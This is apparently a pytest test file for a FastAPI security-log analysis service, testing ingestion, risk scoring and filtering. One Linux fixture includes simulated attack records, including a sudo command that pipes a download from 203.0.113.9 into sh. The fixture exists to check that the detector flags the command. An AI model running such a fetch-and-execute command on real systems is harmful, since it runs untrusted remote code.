import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from fastapi.testclient import TestClient

from app import main, pipeline
from app.main import app
from app.database import Base, engine, SessionLocal
from app.models import Event

client = TestClient(app)


def setup_function(_):
    Base.metadata.drop_all(bind=engine)
    Base.metadata.create_all(bind=engine)


def test_health():
    resp = client.get("/health")
    assert resp.status_code == 200
    assert resp.json()["status"] == "ok"


def test_demo_load_then_stats():
    resp = client.post("/demo/load", params={"num_normal_events": 60})
    assert resp.status_code == 200
    body = resp.json()
    assert body["events_ingested"] > 0

    stats_resp = client.get("/stats")
    assert stats_resp.status_code == 200
    stats = stats_resp.json()
    assert stats["total_events"] == body["events_ingested"]
    assert stats["analyzed_events"] == 0  # not analyzed yet
    assert stats["data_origin_breakdown"]["SYNTHETIC_DEMO"] == body["events_ingested"]


def test_full_flow_demo_analyze_events_suspicious_timeline():
    load_resp = client.post("/demo/load", params={"num_normal_events": 80})
    batch_id = load_resp.json()["batch_id"]

    analyze_resp = client.post("/analysis/run", params={"batch_id": batch_id})
    assert analyze_resp.status_code == 200
    assert analyze_resp.json()["analyzed_events"] > 0

    events_resp = client.get("/events", params={"limit": 500})
    assert events_resp.status_code == 200
    events = events_resp.json()["events"]
    assert len(events) > 0
    assert all("risk_level" in e for e in events)
    # chronological order
    timestamps = [e["timestamp"] for e in events]
    assert timestamps == sorted(timestamps)

    suspicious_resp = client.get("/events/suspicious", params={"min_risk_level": "MEDIUM"})
    assert suspicious_resp.status_code == 200
    suspicious = suspicious_resp.json()["events"]
    assert all(e["risk_level"] in ("MEDIUM", "HIGH", "CRITICAL") for e in suspicious)

    stats_resp = client.get("/stats")
    stats = stats_resp.json()
    assert stats["analyzed_events"] == len(events)

    timeline_resp = client.get("/timeline")
    assert timeline_resp.status_code == 200
    timeline_events = timeline_resp.json()["events"]
    ts = [e["timestamp"] for e in timeline_events]
    assert ts == sorted(ts)


def _macos_events(count=12):
    """Small observed macOS fixture with no Windows-derived fields."""
    return [
        {
            "data_origin": "OBSERVED",
            "operating_system": "macOS",
            "timestamp": f"2026-09-18T10:{index:02d}:00+00:00",
            "event_id": None,
            "log_source": "macOS Unified Log",
            "provider": "/System/Library/TestFramework.framework/Test",
            "level": "Default",
            "computer": "test-mac.local",
            "process_id": 100 + index,
            "process_name": "testprocess",
            "message": f"Observed macOS test event {index}",
            "event_type": "macOS Unified Log Event",
        }
        for index in range(count)
    ]


def test_os_and_origin_scopes_are_consistent_and_analysis_is_isolated():
    demo_resp = client.post("/demo/load", params={"num_normal_events": 60})
    assert demo_resp.status_code == 200

    db = SessionLocal()
    try:
        mac_result = pipeline.ingest_raw_events(db, _macos_events(), batch_id="observed-macos")
    finally:
        db.close()
    assert mac_result["events_ingested"] == 12

    # A source-scoped run intentionally refits only the selected records,
    # even if they have already been analyzed elsewhere in the database.
    analysis_resp = client.post(
        "/analysis/run",
        params={"os": "darwin", "data_origin": "observed"},
    )
    assert analysis_resp.status_code == 200
    analysis = analysis_resp.json()
    assert analysis["analyzed_events"] == 12
    assert analysis["filters"] == {"operating_system": "macOS", "data_origin": "OBSERVED"}

    db = SessionLocal()
    try:
        assert db.query(Event).filter(Event.operating_system == "macOS", Event.analyzed == True).count() == 12  # noqa: E712
        assert db.query(Event).filter(Event.data_origin == "SYNTHETIC_DEMO", Event.analyzed == False).count() == demo_resp.json()["events_ingested"]  # noqa: E712
    finally:
        db.close()

    expected_scope = {"operating_system": "macOS", "data_origin": "OBSERVED"}
    events_resp = client.get("/events", params={"os": "macos", "data_origin": "OBSERVED", "limit": 50})
    assert events_resp.status_code == 200
    assert events_resp.json()["total"] == 12
    assert events_resp.json()["filters"] == expected_scope
    assert all(event["operating_system"] == "macOS" and event["data_origin"] == "OBSERVED" for event in events_resp.json()["events"])

    suspicious_resp = client.get("/events/suspicious", params={"operating_system": "macOS", "data_origin": "OBSERVED"})
    assert suspicious_resp.status_code == 200
    assert suspicious_resp.json()["filters"] == expected_scope
    assert all(event["operating_system"] == "macOS" for event in suspicious_resp.json()["events"])

    timeline_resp = client.get("/timeline", params={"os": "mac", "data_origin": "live"})
    assert timeline_resp.status_code == 200
    assert timeline_resp.json()["count"] == 12
    assert all(event["data_origin"] == "OBSERVED" for event in timeline_resp.json()["events"])

    stats_resp = client.get("/stats", params={"os": "macos", "data_origin": "OBSERVED"})
    assert stats_resp.status_code == 200
    stats = stats_resp.json()
    assert stats["total_events"] == 12
    assert stats["analyzed_events"] == 12
    assert stats["data_origin_breakdown"] == {"OBSERVED": 12, "SYNTHETIC_DEMO": 0}
    assert stats["operating_system_breakdown"] == {"macOS": 12}


def test_get_single_event_includes_raw_data_and_features():
    load_resp = client.post("/demo/load", params={"num_normal_events": 50})
    batch_id = load_resp.json()["batch_id"]
    client.post("/analysis/run", params={"batch_id": batch_id})

    events = client.get("/events", params={"limit": 5}).json()["events"]
    event_id = events[0]["id"]

    detail_resp = client.get(f"/events/{event_id}")
    assert detail_resp.status_code == 200
    detail = detail_resp.json()
    assert "raw_data" in detail
    assert "features" in detail
    assert detail["data_origin"] == "SYNTHETIC_DEMO"


def test_get_nonexistent_event_returns_404():
    resp = client.get("/events/999999")
    assert resp.status_code == 404


def test_collect_on_unsupported_host_returns_clear_error(monkeypatch):
    monkeypatch.setattr(main.platform, "system", lambda: "FreeBSD")
    resp = client.post("/collect")
    assert resp.status_code == 400
    assert "not implemented for FreeBSD" in resp.json()["detail"]


def test_health_reports_host_os_and_live_support(monkeypatch):
    monkeypatch.setattr(main.platform, "system", lambda: "Linux")
    body = client.get("/health").json()
    assert body["host_os"] == "Linux"
    assert body["live_collection_supported"] is True


def _linux_attack_raw_events():
    """Observed-style Linux journal events: normal noise plus an attack."""
    from app.collector.linux_collector import journal_record_to_raw

    base = 1790783044000000
    records = []
    for i in range(40):
        records.append({
            "__REALTIME_TIMESTAMP": str(base + i * 60_000_000),
            "MESSAGE": f"Started Session {i} of User alice.",
            "SYSLOG_IDENTIFIER": "systemd-logind", "PRIORITY": "6", "_HOSTNAME": "web01",
        })
    for i in range(6):
        records.append({
            "__REALTIME_TIMESTAMP": str(base + (41 + i) * 60_000_000),
            "MESSAGE": f"Failed password for invalid user admin from 203.0.113.9 port {40000 + i} ssh2",
            "SYSLOG_IDENTIFIER": "sshd", "PRIORITY": "6", "_HOSTNAME": "web01",
        })
    records.append({
        "__REALTIME_TIMESTAMP": str(base + 50 * 60_000_000),
        "MESSAGE": "mallory : user NOT in sudoers ; TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
        "SYSLOG_IDENTIFIER": "sudo", "PRIORITY": "2", "_HOSTNAME": "web01",
    })
    records.append({
        "__REALTIME_TIMESTAMP": str(base + 51 * 60_000_000),
        "MESSAGE": "alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/bash -c curl http://203.0.113.9/p.sh | sh",
        "SYSLOG_IDENTIFIER": "sudo", "PRIORITY": "5", "_HOSTNAME": "web01",
    })
    return [journal_record_to_raw(r) for r in records]


def test_collect_on_linux_then_analyze_flags_attack(monkeypatch):
    monkeypatch.setattr(main.platform, "system", lambda: "Linux")

    def fake_collect(last, max_events, warnings):
        warnings.append("Only your own user's journal was readable.")
        return _linux_attack_raw_events()

    monkeypatch.setattr(main, "collect_linux_events", fake_collect)

    resp = client.post("/collect", params={"last": "30m"})
    assert resp.status_code == 200
    body = resp.json()
    assert body["operating_system"] == "Linux"
    assert body["collector"].startswith("Linux")
    assert body["warnings"] == ["Only your own user's journal was readable."]

    analysis = client.post("/analysis/run", params={"os": "linux", "data_origin": "OBSERVED"}).json()
    assert analysis["analyzed_events"] == body["events_ingested"]

    events = client.get("/events", params={"os": "linux", "limit": 500}).json()["events"]
    by_type = {}
    for e in events:
        by_type.setdefault(e["event_type"], []).append(e)

    rank = {"LOW": 0, "MEDIUM": 1, "HIGH": 2, "CRITICAL": 3}
    sudo_denied = by_type["Sudo Denied (Not in sudoers)"][0]
    assert any("not in sudoers" in r for r in sudo_denied["analysis_reasons"])
    download_exec = by_type["Sudo Command Executed"][0]
    assert any("Suspicious shell command" in r for r in download_exec["analysis_reasons"])
    assert rank[download_exec["risk_level"]] >= rank["HIGH"]
    brute = by_type["SSH Failed Login (Invalid User)"]
    assert all(any("non-existent user" in r for r in e["analysis_reasons"]) for e in brute)
    normal = by_type["systemd-logind log"]
    assert max(e["risk_score"] for e in brute) > max(e["risk_score"] for e in normal)


def test_timeline_limit_returns_most_recent_events_in_order():
    client.post("/demo/load", params={"num_normal_events": 60})
    all_events = client.get("/timeline", params={"limit": 5000}).json()["events"]
    recent = client.get("/timeline", params={"limit": 10}).json()["events"]
    assert [e["id"] for e in recent] == [e["id"] for e in all_events[-10:]]
    ts = [e["timestamp"] for e in recent]
    assert ts == sorted(ts)
